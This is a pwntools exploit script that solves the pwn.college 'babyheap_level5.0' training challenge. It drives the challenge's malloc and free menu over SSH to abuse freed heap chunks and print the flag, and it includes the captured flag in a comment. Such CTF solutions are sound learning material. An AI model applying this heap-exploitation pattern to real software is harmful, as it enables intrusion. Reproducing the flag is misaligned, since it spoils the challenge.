from pwn import *

def _malloc(index, size):
    io.sendlineafter(b": ", b"malloc")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.sendlineafter(b"Size: ",  str(size).encode())

def _free(index):
    io.sendlineafter(b": ", b"free")
    io.sendlineafter(b"Index: ", str(index).encode())

def _puts(index):
    io.sendlineafter(b": ", b"puts")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.recvuntil(b'Data: ')
    return io.recvline().decode()

def _read_flag():
    io.sendlineafter(b": ", b"read_flag")

def _puts_flag():
    io.sendlineafter(b": ", b"puts_flag")
    io.interactive()

s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")
io = s.process("/challenge/babyheap_level5.0")

# set ptr[0] -> flag
_malloc(0, 656)
_free(0)
_read_flag()

# set_ptr[1] -> flag
_malloc(1, 656)
_free(1)
_read_flag()

_free(0)
_free(1)
_puts_flag()
# Flag: pwn.college{YQQzV807YCI4w5ISjTGzbdcPDF6.0VO3MDLxIjNyEzW}